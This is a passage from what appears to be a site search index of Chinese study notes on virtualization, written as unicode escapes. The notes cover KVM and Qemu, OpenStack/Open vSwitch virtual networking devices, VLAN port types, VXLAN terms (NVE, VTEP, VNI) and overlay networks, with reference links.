\u4e00\u79cd\u7f51\u7edc\u865a\u62df\u5316\u6280\u672f\uff0c\u901a\u8fc7\u5c06VM\u6216\u7269\u7406\u670d\u52a1\u5668\u53d1\u51fa\u7684\u6570\u636e\u5305\u5c01\u88c5\u5728UDP\u4e2d\uff0c\u5e76\u4f7f\u7528\u7269\u7406\u7f51\u7edc\u7684IP/MAC\u4f5c\u4e3a\u62a5\u6587\u5934\u8fdb\u884c\u5c01\u88c5\uff0c\u7136\u540e\u5728IP\u7f51\u7edc\u4e0a\u4f20\u8f93\uff0c\u5230\u8fbe\u76ee\u7684\u5730\u540e\u7531\u96a7\u9053\u7ec8\u7ed3\u70b9\u89e3\u5c01\u88c5\u5e76\u5c06\u6570\u636e\u53d1\u9001\u7ed9\u76ee\u6807\u865a\u62df\u673a\u6216\u7269\u7406\u670d\u52a1\u5668\u3002 NVE (Network Virtual Endpoint) \u7f51\u7edc\u865a\u62df\u8fb9\u7f18\u8282\u70b9NVE\uff0c\u662f\u5b9e\u73b0\u7f51\u7edc\u865a\u62df\u5316\u529f\u80fd\u7684\u7f51\u7edc\u5b9e\u4f53\u3002\u62a5\u6587\u7ecf\u8fc7NVE\u5c01\u88c5\u8f6c\u6362\u540e\uff0cNVE\u95f4\u5c31\u53ef\u57fa\u4e8e\u4e09\u5c42\u57fa\u7840\u7f51\u7edc\u5efa\u7acb\u4e8c\u5c42\u865a\u62df\u5316\u7f51\u7edc\u3002 VTEP (VXLAN Tunnel Endpoints) VTEP\u662fVXLAN\u96a7\u9053\u7aef\u70b9\uff0c\u5c01\u88c5\u5728NVE\u4e2d\uff0c\u7528\u4e8eVXLAN\u62a5\u6587\u7684\u5c01\u88c5\u548c\u89e3\u5c01\u88c5\u3002 VNI (VXLAN Network Identifier) VNI \u662f\u6bcf\u4e2a vxlan \u7684\u6807\u8bc6\uff0c\u662f\u4e2a 24 \u4f4d\u6574\u6570\uff0c\u4e00\u5171\u6709 2^24 = 16,777,216\uff08\u4e00\u5343\u591a\u4e07\uff09\uff0c\u4e00\u822c\u6bcf\u4e2a VNI \u65e2\u53ef\u4ee5\u5bf9\u5e94\u4e00\u4e2a\u79df\u6237\u4e5f\u53ef\u4ee5\u5bf9\u5e94\u4e00\u4e2asubnet,\u4e0d\u540cVXLAN\u6bb5\u7684\u865a\u62df\u673a\u4e0d\u80fd\u76f4\u63a5\u4e8c\u5c42\u76f8\u4e92\u901a\u4fe1\u3002 \u53c2\u8003\u8d44\u6599 https://cloud.tencent.com/developer/article/1083461 https://forum.huawei.com/enterprise/zh/thread-334207.html GRE OverLay Overlay\u7f51\u7edc\u662f\u5c06\u5df2\u6709\u7684\u7269\u7406\u7f51\u7edc\uff08Underlay\u7f51\u7edc\uff09\u4f5c\u4e3a\u57fa\u7840\uff0c\u5728\u5176\u4e0a\u5efa\u7acb\u53e0\u52a0\u7684\u903b\u8f91\u7f51\u7edc\uff0c\u5b9e\u73b0\u7f51\u7edc\u8d44\u6e90\u7684\u865a\u62df\u5316 Overlay\u7f51\u7edc\u662f\u5efa\u7acb\u5728\u5df2\u6709\u7269\u7406\u7f51\u7edc\u4e0a\u7684\u865a\u62df\u7f51\u7edc\uff0c\u5177\u6709\u72ec\u7acb\u7684\u63a7\u5236\u548c\u8f6c\u53d1\u5e73\u9762\uff0c\u5bf9\u4e8e\u8fde\u63a5\u5230Overlay\u7684\u7ec8\u7aef\u8bbe\u5907\uff08\u4f8b\u5982\u670d\u52a1\u5668\uff09\u6765\u8bf4\uff0c\u7269\u7406\u7f51\u7edc\u662f\u900f\u660e\u7684\uff0c\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0\u627f\u8f7d\u7f51\u7edc\u548c\u4e1a\u52a1\u7f51\u7edc\u7684\u5206\u79bb\u3002 Overlay\u6280\u672f\u6709\u591a\u79cd\uff0c\u4f8b\u5982VXLAN\u3001NVGRE\u3001STT\u7b49\uff0c\u5176\u4e2dVXLAN\u662f\u76ee\u524d\u83b7\u5f97\u6700\u5e7f\u6cdb\u652f\u6301\u7684Overlay\u6280\u672f\u3002 \u53c2\u8003\u8d44\u6599 https://support.huawei.com/enterprise/zh/doc/EDOC1100023543?section=j015 IPtable","title":"\u865a\u62df\u5316"},{"location":"Note/\u865a\u62df\u5316/#_1","text":"\u865a\u62df\u5316\u4f7f\u5f97\u5728\u4e00\u53f0\u7269\u7406\u7684\u670d\u52a1\u5668\u4e0a\u53ef\u4ee5\u8dd1\u591a\u53f0\u865a\u62df\u673a\uff0c\u865a\u62df\u673a\u5171\u4eab\u7269\u7406\u673a\u7684 CPU\u3001\u5185\u5b58\u3001IO \u786c\u4ef6\u8d44\u6e90\uff0c\u4f46\u903b\u8f91\u4e0a\u865a\u62df\u673a\u4e4b\u95f4\u662f\u76f8\u4e92\u9694\u79bb\u7684 \u4e3b\u6d41\u7684\u865a\u62df\u5316\u67b6\u6784\u5206\u4e3a\uff1a \u5bb9\u5668\u6a21\u5f0f \u4e3b\u673a\u6a21\u5f0f \u88f8\u673a\u6a21\u5f0f \u6df7\u5408 \u865a\u62df\u5316\u6280\u672f\u57fa\u4e8eHypervisor\u5c06\u5bbf\u4e3b\u673aHost\u7684\u786c\u4ef6\u8d44\u6e90\u865a\u62df\u5316\u7ed9\u5ba2\u6237\u673aGuest\uff0c\u901a\u8fc7Hypervisor\u5b9e\u73b0\u7684\u65b9\u5f0f\u7684\u4e0d\u540c\u5206\u4e3a \u4e00\u578b\u865a\u62df\u5316 \u76f4\u63a5\u5728\u7269\u7406\u673a\u4e0a\u7684\u865a\u62df\u5316\uff0c\u591a\u4e2a\u865a\u62df\u673a\u5728 Hypervisor \u4e0a\u8fd0\u884c Hypervisor \u5b9e\u73b0\u65b9\u5f0f\u4e00\u822c\u662f\u4e00\u4e2a\u7279\u6b8a\u5b9a\u5236\u7684 Linux \u7cfb\u7edf \u4ee3\u8868\u6280\u672f\uff1aXen\uff0cESXI \u4e8c\u578b\u865a\u62df\u5316 Hypervisor \u4f5c\u4e3a OS \u4e0a\u7684\u4e00\u4e2a\u7a0b\u5e8f\u6a21\u5757\u8fd0\u884c\uff0c\u5e76\u5bf9\u7ba1\u7406\u865a\u62df\u673a\u8fdb\u884c\u7ba1\u7406\u3002 \u4ee3\u8868\u6280\u672f\uff1aKVM\uff0cVirtualBox \u548c VMWare Workstation \u76ee\u524d\u8f83\u6d41\u884c\u7684\u662fKVM(Kernel-Based Virtual Machine)\u865a\u62df\u5316\u6280\u672f\u7ed3\u5408 Qemu \u6765\u5b9e\u73b0\u865a\u62df\u5316 KVM \u662f\u57fa\u4e8e Linux \u5185\u6838\u5b9e\u73b0\u7684\uff0cKVM \u6709\u4e00\u4e2a\u5185\u6838\u6a21\u5757\u53eb kvm.ko\uff0c\u53ea\u7528\u4e8e\u7ba1\u7406\u865a\u62df CPU \u548c\u5185\u5b58\u3002 \u90a3 IO \u7684\u865a\u62df\u5316\uff0c\u5982\u5b58\u50a8\u548c\u7f51\u7edc\u8bbe\u5907\u4ea4\u7ed9 Linux \u5185\u6838\u548c Qemu \u6765\u5b9e\u73b0\u3002 KVM \u672c\u8eab\u53ea\u5173\u6ce8\u865a\u62df\u673a\u8c03\u5ea6\u548c\u5185\u5b58\u7ba1\u7406\u8fd9\u4e24\u4e2a\u65b9\u9762\u3002IO \u5916\u8bbe\u7684\u4efb\u52a1\u4ea4\u7ed9 Linux \u5185\u6838\u548c Qemu\u3002","title":"\u8ba1\u7b97\u865a\u62df\u5316\u6280\u672f\u6982\u8ff0"},{"location":"Note/\u865a\u62df\u5316/#kvm","text":"","title":"KVM"},{"location":"Note/\u865a\u62df\u5316/#qemu","text":"","title":"Qemu"},{"location":"Note/\u865a\u62df\u5316/#_2","text":"\u4e0b\u56fe\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u4e86Open vSwitch\uff08OVS\uff09\u865a\u62df\u7f51\u7edc\u7684\u903b\u8f91\u56fe https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux_OpenStack_Platform/5/html/Cloud_Administrator_Guide/section_networking-scenarios.html \u7b80\u5355\u7684\u8bf4\u4e00\u4e0b\u56fe\u4e2d\u7684\u610f\u601d \u8be5\u56fe\u6709\u4e09\u4e2a\u865a\u62df\u673a vm01\uff0cvm02\uff0cvm03\u3002\u5176\u4e2d vm01\u3001vm03\u6709\u5404\u6709\u4e00\u5757\u865a\u62df\u7f51\u5361eth0\u5e76\u5206\u914d\u4e86\u4e00\u4e2aip\u5730\u5740\uff0cvm02\u6709\u4e24\u5757\u865a\u62df\u7f51\u5361eth0\u3001eth1\uff0c\u540c\u65f6\u5404\u4e2a\u7f51\u5361\u4e5f\u5206\u914d\u4e86\u4e00\u4e2aip\u5730\u5740\u3002\u901a\u8fc7\u4ee5\u4e0b\u7684\u5404\u4e2a\u8bbe\u5907\uff0c\u5b9e\u73b0openstack\u7684\u865a\u62df\u7f51\u7edc \u8981\u4f7f\u4ee5\u592a\u7f51\u5e27\u4ece\u865a\u62df\u673a vm01 \u7684 eth0 \u4f20\u8f93\u5230\u7269\u7406\u7f51\u7edc\uff0c\u5b83\u5fc5\u987b\u901a\u8fc7\u4e3b\u673a\u5185\u76849\u4e2a\u8bbe\u5907\uff1avnet 0\uff0cqbrXXX\uff0cqvbXXX\uff0cqvoXXX\uff0cbr-int\uff0cint-br-eth1\uff0cphy-br-eth1\uff0cbr-eth1\u4ee5\u53ca\u6700\u540e\u7684\u7269\u7406\u7f51\u5361eth1 TAP device TAP \u8bbe\u5907\uff08\u4f8b\u5982vnet0\uff09\u662f\u8bf8\u5982 KVM \u4e4b\u7c7b\u7684 Hypervisor \u5b9e\u73b0\u865a\u62df\u7f51\u5361\uff08\u901a\u5e38\u79f0\u4e3a VIF \u6216 vNIC \uff09\u3002 Guest\u7cfb\u7edf\u63a5\u6536\u6765\u81ea TAP \u8bbe\u5907\u7684\u4ee5\u592a\u7f51\u5e27 veth pair veth pair \u662f\u4e00\u5bf9\u76f4\u63a5\u8fde\u63a5\u7684\u865a\u62df\u7f51\u7edc\u63a5\u53e3\u3002 \u53d1\u9001\u5230veth pair \u4e00\u7aef\u7684\u4ee5\u592a\u7f51\u5e27\u7531 veth pair \u7684\u53e6\u4e00\u7aef\u63a5\u6536\u3002 \u7f51\u7edc\u4f7f\u7528 veth pair \u4f5c\u4e3a\u865a\u62df\u8df3\u7ebf\uff0c\u4ee5\u5728\u865a\u62df\u7f51\u6865\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\u3002 Linux Bridge Linux Bridge\u7684\u884c\u4e3a\u53ef\u4ee5\u770b\u4f5c\u4e00\u4e2ahub\uff08 \u672c\u56fe\u4e2d \uff09\uff0c\u53ef\u4ee5\u5c06\u591a\u4e2a\u7269\u7406\u8bbe\u5907\u6216\u662f\u865a\u62df\u8bbe\u5907\u94fe\u63a5\u5230 Linux Bridge \u4e2d\u3002Linux Bridge \u7684\u4efb\u4f55\u4e00\u4e2a\u5df2\u8fde\u63a5\u7684\u63a5\u53e3\u8fdb\u5165\u6240\u6709\u4ee5\u592a\u7f51\u5e27\u90fd\u4f1a\u4f20\u8f93\u5230\u5176\u4ed6\u6240\u6709\u8bbe\u5907 \u96c6\u7ebf\u5668\uff08hub\uff09\uff1a\u4e00\u4e2a\u53e3\u6536\u5230\u7684\u4fe1\u53f7\uff0c\u539f\u5c01\u4e0d\u52a8\u7684\u53d1\u9001\u7ed9\u6240\u6709\u5176\u4ed6\u7684\u53e3\uff0c\u7531\u5176\u4ed6\u7684\u53e3\u4e0a\u7684\u8bbe\u5907\u81ea\u5df1\u51b3\u5b9a\u662f\u5426\u63a5\u6536\u4fe1\u53f7\u3002\u6709\u70b9\u7c7b\u4f3c\u5e7f\u64ad\uff0c\u4f46\u662f\u6bd4\u5e7f\u64ad\u66f4\u7eaf\u7cb9\u3002\u7531\u4e8ehub\u53ea\u662f\u7b80\u5355\u7684\u8f6c\u53d1\uff0c\u6240\u4ee5hub\u5de5\u4f5c\u5728\u7269\u7406\u5c42\uff08L1\uff09 Open vSwitch Open vSwitch \u7684\u884c\u4e3a\u7c7b\u4f3c\u4e8e\u865a\u62df\u4ea4\u6362\u673a\uff0c\u7f51\u7edc\u8bbe\u5907\u8fde\u63a5\u5230Open vSwitch\u7684\u7aef\u53e3\uff0c\u7aef\u53e3\u7684\u914d\u7f6e\u5f88\u50cf\u7269\u7406\u4ea4\u6362\u673a\u7684\u7aef\u53e3\uff0c\u5305\u62ecVLAN\u914d\u7f6e","title":"\u7f51\u7edc\u865a\u62df\u5316\u6982\u8ff0"},{"location":"Note/\u865a\u62df\u5316/#vlan","text":"LAN \u8868\u793a Local Area Network\uff0c\u672c\u5730\u5c40\u57df\u7f51\uff0c\u901a\u5e38\u4f7f\u7528 Hub \u548c Switch \u6765\u8fde\u63a5 LAN \u4e2d\u7684\u8ba1\u7b97\u673a\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e24\u53f0\u8ba1\u7b97\u673a\u8fde\u5165\u540c\u4e00\u4e2a Hub \u6216\u8005 Switch \u65f6\uff0c\u5b83\u4eec\u5c31\u5728\u540c\u4e00\u4e2a LAN \u4e2d\u3002 \u4e00\u4e2a LAN \u8868\u793a\u4e00\u4e2a\u5e7f\u64ad\u57df\u3002 \u5176\u542b\u4e49\u662f\uff1a LAN \u4e2d\u7684\u6240\u6709\u6210\u5458\u90fd\u4f1a\u6536\u5230\u4efb\u610f\u4e00\u4e2a\u6210\u5458\u53d1\u51fa\u7684\u5e7f\u64ad\u5305 \u3002 VLAN \u8868\u793a Virtual LAN\u3002\u4e00\u4e2a\u5e26\u6709 VLAN \u529f\u80fd\u7684switch \u80fd\u591f\u5c06\u81ea\u5df1\u7684\u7aef\u53e3\u5212\u5206\u51fa\u591a\u4e2a LAN\u3002 \u8ba1\u7b97\u673a\u53d1\u51fa\u7684\u5e7f\u64ad\u5305\u53ef\u4ee5\u88ab\u540c\u4e00\u4e2a LAN \u4e2d\u5176\u4ed6\u8ba1\u7b97\u673a\u6536\u5230\uff0c\u4f46\u4f4d\u4e8e\u5176\u4ed6 LAN \u7684\u8ba1\u7b97\u673a\u5219\u65e0\u6cd5\u6536\u5230\u3002 \u7b80\u5355\u5730\u8bf4\uff0cVLAN \u5c06\u4e00\u4e2a\u4ea4\u6362\u673a\u5206\u6210\u4e86\u591a\u4e2a\u4ea4\u6362\u673a\uff0c\u9650\u5236\u4e86\u5e7f\u64ad\u7684\u8303\u56f4\uff0c\u5728\u4e8c\u5c42\u5c06\u8ba1\u7b97\u673a\u9694\u79bb\u5230\u4e0d\u540c\u7684 VLAN \u4e2d\u3002 VLAN \u662f \u4e8c\u5c42\u4e0a\u7684\u9694\u79bb \uff0c\u903b\u8f91\u5206\u5272\u5e7f\u64ad\u57df\u3002\u5c06\u4e0d\u540c\u63a5\u53e3\u52a0\u5165\u4e0d\u540cVLAN \u79cd\u7c7b \u9759\u6001VLAN \u57fa\u4e8e\u7aef\u53e3\u7684\u5212\u5206\u7684VLAN \u52a8\u6001VLAN \u57fa\u4e8eMAC\u5730\u5740\u5212\u5206\u7684\u52a8\u6001VLAN","title":"VLAN"},{"location":"Note/\u865a\u62df\u5316/#vlan_1","text":"Access \u6536\u5230\u4e00\u4e2a\u62a5\u6587\uff0c\u5224\u65ad\u662f\u5426\u6709VLAN\u4fe1\u606f \u5982\u679c\u6ca1\u6709\u5219\u6253\u4e0a\u7aef\u53e3\u7684PVID\uff0c\u5e76\u8fdb\u884c\u4ea4\u6362\u8f6c\u53d1 \u5982\u679c\u6709\u5219\u76f4\u63a5\u4e22\u5f03\uff08\u7f3a\u7701\uff09 \u53d1\u62a5\u6587\u65f6\uff0c\u5c06\u62a5\u6587\u7684VLAN\u4fe1\u606f\u5265\u79bb\uff0c\u76f4\u63a5\u53d1\u9001\u51fa\u53bb Trunk \u6536\u5230\u4e00\u4e2a\u62a5\u6587\uff0c\u5224\u65ad\u662f\u5426\u6709VLAN\u4fe1\u606f\uff1a \u5982\u679c\u6ca1\u6709\u5219\u6253\u4e0a\u7aef\u53e3\u7684PVID\uff0c\u5e76\u8fdb\u884c\u4ea4\u6362\u8f6c\u53d1 \u5982\u679c\u6709\u5224\u65ad\u8be5trunk\u7aef\u53e3\u662f\u5426\u5141\u8bb8\u8be5 VLAN\u7684\u6570\u636e\u8fdb\u5165 \u5982\u679c\u5141\u8bb8\u5219\u62a5\u6587\u643a\u5e26\u539f\u6709VLAN\u6807\u8bb0\u8fdb\u884c\u8f6c\u53d1\uff0c\u5426\u5219\u4e22\u5f03\u8be5\u62a5\u6587\u3002 \u53d1\u62a5\u6587\u65f6\uff0c\u6bd4\u8f83\u7aef\u53e3\u7684PVID\u548c\u5c06\u8981\u53d1\u9001\u62a5\u6587\u7684VLAN\u4fe1\u606f \u5982\u679c\u4e24\u8005\u76f8\u7b49\u5219\u5265\u79bbVLAN\u4fe1\u606f\uff0c\u518d\u53d1\u9001 \u5426\u5219\u62a5\u6587\u5c06\u643a\u5e26\u539f\u6709\u7684VLAN\u6807\u8bb0\u8fdb\u884c\u8f6c\u53d1\u3002 Hybrid \u6536\u5230\u4e00\u4e2a\u62a5\u6587\uff0c\u5224\u65ad\u662f\u5426\u6709VLAN\u4fe1\u606f \u5982\u679c\u6ca1\u6709\u5219\u6253\u4e0a\u7aef\u53e3\u7684PVID\uff0c\u5e76\u8fdb\u884c\u4ea4\u6362\u8f6c\u53d1 \u5982\u679c\u6709\u5219\u5224\u65ad\u8be5hybrid\u7aef\u53e3\u662f\u5426\u5141\u8bb8\u8be5VLAN\u7684\u6570\u636e\u8fdb\u5165 \u5982\u679c\u53ef\u4ee5\u5219\u8f6c\u53d1\uff0c\u5426\u5219\u4e22\u5f03\u3002 \u53d1\u62a5\u6587\u65f6\uff0c\u5224\u65ad\u8be5VLAN\u5728\u672c\u7aef\u53e3\u7684\u5c5e\u6027 \u5982\u679c\u662funtag\u5219\u5265\u79bbVLAN\u4fe1\u606f\uff0c\u518d\u53d1\u9001\uff0c \u5982\u679c\u662ftag\u5219\u6bd4\u8f83\u7aef\u53e3\u7684PVID\u548c\u5c06\u8981\u53d1\u9001\u62a5\u6587\u7684VLAN\u4fe1\u606f\uff0c \u5982\u679c\u4e24\u8005\u76f8\u7b49\u5219\u5265\u79bbVLAN\u4fe1\u606f\uff0c\u518d\u53d1\u9001 \u5426\u5219\u62a5\u6587\u5c06\u643a\u5e26\u539f\u6709\u7684VLAN\u6807\u8bb0\u8fdb\u884c\u8f6c\u53d1\u3002","title":"VLAN\u7aef\u53e3"},{"location":"Note/\u865a\u62df\u5316/#vxlan","text":"Virtual Extensible LAN \u662f\u4e3a\u4e86\u5f25\u8865VLAN\u7684\u4e0d\u8db3\uff0c\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762 \u865a\u62df\u5316\u6280\u672f\u7684\u53d1\u5c55\u4fc3\u4f7f\u5927\u6570\u636e\u3001\u4e91\u8ba1\u7b97\u6280\u672f\u516c\u53f8\u91c7\u7528\u5355\u4e2a\u7269\u7406\u8bbe\u5907\u865a\u62df\u591a\u53f0\u865a\u62df\u673a\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u7ec4\u7f51\uff0c\u968f\u7740\u5e94\u7528\u6a21\u5757\u7684\u589e\u52a0\uff0c\u5bf9\u4e8e\u652f\u6301VLAN\u6570\u76ee\u7684\u8981\u6c42\u4e5f\u5728\u63d0\u5347\uff0c802.1Q\u6807\u51c6\u4e2d\u7684 \u6700\u591a\u652f\u63014094\u4e2aVLAN\u7684\u80fd\u529b\u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u5f53\u4e0b\u9700\u6c42 \u516c\u6709\u4e91\u63d0\u4f9b\u5546\u7684\u4e1a\u52a1\u8981\u6c42\u5c06\u5b9e\u4f53\u7f51\u7edc\u79df\u501f\u7ed9\u591a\u4e2a\u4e0d\u540c\u7684\u7528\u6237\uff0c\u8fd9\u4e9b\u7528\u6237\u5bf9\u4e8e\u7f51\u7edc\u7684\u8981\u6c42\u6709\u6240\u4e0d\u540c\uff0c\u800c\u4e0d\u540c\u7528\u6237\u79df\u501f\u7684\u7f51\u7edc\u6709\u5f88\u5927\u7684\u53ef\u80fd \u4f1a\u51fa\u73b0IP\u5730\u5740\u3001MAC\u5730\u5740\u7684\u91cd\u53e0 \uff0c\u4f20\u7edf\u7684VLAN\u4ec5\u4ec5\u89e3\u51b3\u4e86\u540c\u4e00\u94fe\u8def\u5c42\u7f51\u7edc\u5e7f\u64ad\u57df\u9694\u79bb\u7684\u95ee\u9898\uff0c\u800c\u5e76\u6ca1\u6709\u6d89\u53ca\u5230\u7f51\u7edc\u5730\u5740\u91cd\u53e0\u7684\u95ee\u9898\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b0\u7684\u6280\u672f\u6765\u4fdd\u8bc1\u5728\u591a\u4e2a\u79df\u6237\u7f51\u7edc\u4e2d\u5b58\u5728\u5730\u5740\u91cd\u53e0\u7684\u60c5\u51b5\u4e0b\u4f9d\u65e7\u80fd\u6709\u6548\u901a\u4fe1\u7684\u6280\u672f \u865a\u62df\u5316\u6280\u672f\u7684\u51fa\u73b0\u589e\u52a0\u4e86\u4ea4\u6362\u673a\u7684\u8d1f\u62c5\uff0c\u5bf9\u4e8e\u5927\u578b\u7684\u6570\u636e\u4e2d\u5fc3\u800c\u8a00\uff0c\u5355\u53f0\u4ea4\u6362\u673a\u5fc5\u987b\u652f\u6301\u6570\u5341\u53f0\u4ee5\u4e0a\u4e3b\u673a\u7684\u901a\u4fe1\u8fde\u63a5\u624d\u8db3\u4ee5\u6ee1\u8db3\u5e94\u7528\u9700\u6c42\uff0c\u800c\u865a\u62df\u5316\u6280\u672f\u4f7f\u5f97\u5355\u53f0\u4e3b\u673a\u53ef\u4ee5\u865a\u62df\u5316\u51fa\u591a\u53f0\u865a\u62df\u673a\u540c\u65f6\u8fd0\u884c\uff0c\u800c\u6bcf\u53f0\u865a\u62df\u673a\u90fd\u4f1a\u6709\u5176\u552f\u4e00\u7684MAC\u5730\u5740\u3002\u8fd9\u6837\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u96c6\u7fa4\u4e2d\u6240\u6709\u865a\u673a\u53ef\u4ee5\u6b63\u5e38\u901a\u4fe1\uff0c\u4ea4\u6362\u673a\u5fc5\u987b\u4fdd\u5b58\u6bcf\u53f0\u865a\u673a\u7684MAC\u5730\u5740\uff0c\u8fd9\u6837\u5c31\u5bfc\u81f4\u4e86 \u4ea4\u6362\u673a\u4e2d\u7684MAC\u8868\u5f02\u5e38\u5e9e\u5927\uff0c\u4ece\u800c\u5f71\u54cd\u4ea4\u6362\u673a\u7684\u8f6c\u53d1\u6027\u80fd VXLAN\u6280\u672f\u662f\u7f51\u7edcOverlay\u6280\u672f\u7684\u4e00\u79cd\u5b9e\u73b0\uff0cOverlay\u76f4\u8bd1\u4e3a\u8986\u76d6\uff0c\u5373\u5728 \u7269\u7406\u7f51\u7edc\u62d3\u6251\u7684\u57fa\u7840\u4e0a\u6784\u5efa\u7684\u903b\u8f91\u7f51\u7edc \u3002\u5bf9\u4e8e\u6784\u5efa\u5728Overlay\u4e0a\u7684\u7ec8\u7aef\u800c\u8a00\uff0c\u7269\u7406\u7f51\u7edc\u7684\u62ec\u6251\u7ed3\u6784\u5bf9\u5176\u662f\u900f\u660e\u7684\u3002 VXLAN\u6280\u672f\u53ef\u4ee5 \u57fa\u4e8e\u4e09\u5c42\u7f51\u7edc\u7ed3\u6784\u6765\u6784\u5efa\u4e8c\u5c42\u865a\u62df\u7f51\u7edc \uff0c\u901a\u8fc7VLAN\u6280\u672f\u53ef\u4ee5\u5c06\u5904\u4e8e\u4e0d\u540c\u7f51\u6bb5\u7f51\u7edc\u8bbe\u5907\u6574\u5408\u5728\u540c\u4e00\u4e2a\u903b\u8f91\u94fe\u8def\u5c42\u7f51\u7edc\u4e2d\uff0c\u5bf9\u4e8e\u7ec8\u7aef\u7528\u6237\u800c\u8a00\uff0c\u8fd9\u4e9b\u7f51\u7edc\u8bbe\u5907\u4f3c\u4e4e\u201c\u771f\u5b9e\u5730\u201d\u90e8\u7f72\u5728\u4e86\u540c\u4e00\u4e2a\u94fe\u8def\u5c42\u7f51\u7edc\u4e2d\u3002 \u4e0b\u56fe\u4e3aVXLAN\u62a5\u6587\u683c\u5f0f\uff0c\u539f\u59cb\u62a5\u6587\u5728VXLAN\u63a5\u5165\u70b9\uff08\u88ab\u79f0\u4e3aVTEP\uff09 \u52a0\u4e0aVXLAN\u5e27\u5934\u540e\u518d\u88ab\u5c01\u88c5\u5728UDP\u62a5\u5934\u4e2d \uff0c\u5e76\u4f7f\u7528\u627f\u8f7d\u7f51\u7edc\u7684IP/MAC\u5730\u5740\u4f5c\u4e3a\u5916\u5c42\u5934\u8fdb\u884c\u5c01\u88c5\uff0c\u627f\u8f7d\u7f51\u7edc\u53ea\u9700\u8981\u6309\u7167\u666e\u901a\u7684\u4e8c\u4e09\u5c42\u8f6c\u53d1\u6d41\u7a0b\u8fdb\u884c\u8f6c\u53d1\u5373\u53ef\u3002","title":"VXLAN"},{"location":"Note/\u865a\u62df\u5316/#vxlan_1","text":"VXLAN (Virtual eXtensible Local Area Network) \u4e00\u79cd\u7f51\u7edc\u865a\u62df\u5316\u6280\u672f\uff0c\u901a\u8fc7\u5c06VM\u6216\u7269\u7406\u670d\u52a1\u5668\u53d1\u51fa\u7684\u6570\u636e\u5305\u5c01\u88c5\u5728UDP\u4e2d\uff0c\u5e76\u4f7f\u7528\u7269\u7406\u7f51\u7edc\u7684IP/MAC\u4f5c\u4e3a\u62a5\u6587\u5934\u8fdb\u884c\u5c01\u88c5\uff0c\u7136\u540e\u5728IP\u7f51\u7edc\u4e0a\u4f20\u8f93\uff0c\u5230\u8fbe\u76ee\u7684\u5730\u540e\u7531\u96a7\u9053\u7ec8\u7ed3\u70b9\u89e3\u5c01\u88c5\u5e76\u5c06\u6570\u636e\u53d1\u9001\u7ed9\u76ee\u6807\u865a\u62df\u673a\u6216\u7269\u7406\u670d\u52a1\u5668\u3002 NVE (Network Virtual Endpoint) \u7f51\u7edc\u865a\u62df\u8fb9\u7f18\u8282\u70b9NVE\uff0c\u662f\u5b9e\u73b0\u7f51\u7edc\u865a\u62df\u5316\u529f\u80fd\u7684\u7f51\u7edc\u5b9e\u4f53\u3002\u62a5\u6587\u7ecf\u8fc7NVE\u5c01\u88c5\u8f6c\u6362\u540e\uff0cNVE\u95f4\u5c31\u53ef\u57fa\u4e8e\u4e09\u5c42\u57fa\u7840\u7f51\u7edc\u5efa\u7acb\u4e8c\u5c42\u865a\u62df\u5316\u7f51\u7edc\u3002 VTEP (VXLAN Tunnel Endpoints) VTEP\u662fVXLAN\u96a7\u9053\u7aef\u70b9\uff0c\u5c01\u88c5\u5728NVE\u4e2d\uff0c\u7528\u4e8eVXLAN\u62a5\u6587\u7684\u5c01\u88c5\u548c\u89e3\u5c01\u88c5\u3002 VNI (VXLAN Network Identifier) VNI \u662f\u6bcf\u4e2a vxlan \u7684\u6807\u8bc6\uff0c\u662f\u4e2a 24 \u4f4d\u6574\u6570\uff0c\u4e00\u5171\u6709 2^24 = 16,777,216\uff08\u4e00\u5343\u591a\u4e07\uff09\uff0c\u4e00\u822c\u6bcf\u4e2a VNI \u65e2\u53ef\u4ee5\u5bf9\u5e94\u4e00\u4e2a\u79df\u6237\u4e5f\u53ef\u4ee5\u5bf9\u5e94\u4e00\u4e2asubnet,\u4e0d\u540cVXLAN\u6bb5\u7684\u865a\u62df\u673a\u4e0d\u80fd\u76f4\u63a5\u4e8c\u5c42\u76f8\u4e92\u901a\u4fe1\u3002 \u53c2\u8003\u8d44\u6599 https://cloud.tencent.com/developer/article/1083461 https://forum.huawei.com/enterprise/zh/thread-334207.html","title":"VXLAN \u6a21\u578b"},{"location":"Note/\u865a\u62df\u5316/#gre","text":"","title":"GRE"},{"location":"Note/\u865a\u62df\u5316/#overlay","text":"Overlay\u7f51\u7edc\u662f\u5c06\u5df2\u6709\u7684\u7269\u7406\u7f51\u7edc\uff08Underlay\u7f51\u7edc\uff09\u4f5c\u4e3a\u57fa\u7840\uff0c\u5728\u5176\u4e0a\u5efa\u7acb\u53e0\u52a0\u7684\u903b\u8f91\u7f51\u7edc\uff0c\u5b9e\u73b0\u7f51\u7edc\u8d44\u6e90\u7684\u865a\u62df\u5316 Overlay\u7f51\u7edc\u662f\u5efa\u7acb\u5728\u5df2\u6709\u7269\u7406\u7f51\u7edc\u4e0a\u7684\u865a\u62df\u7f51\u7edc\uff0c\u5177\u6709\u72ec\u7acb\u7684\u63a7\u5236\u548c\u8f6c\u53d1\u5e73\u9762\uff0c\u5bf9\u4e8e\u8fde\u63a5\u5230Overlay\u7684\u7ec8\u7aef\u8bbe\u5907\uff08\u4f8b\u5982\u670d\u52a1\u5668\uff09\u6765\u8bf4\uff0c\u7269\u7406\u7f51\u7edc\u662f\u900f\u660e\u7684\uff0c\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0\u627f\u8f7d\u7f51\u7edc\u548c\u4e1a\u52a1\u7f51\u7edc\u7684\u5206\u79bb\u3002 Overlay\u6280\u672f\u6709\u591a\u79cd\uff0c\u4f8b\u5982VXLAN\u3001NVGRE\u3001STT\u7b49\uff0c\u5176\u4e2dVXLAN\u662f\u76ee\u524d\u83b7\u5f97\u6700\u5e7f\u6cdb\u652f\u6301\u7684Overlay\u6280\u672f\u3002 \u53c2\u8003\u8d44\u6599 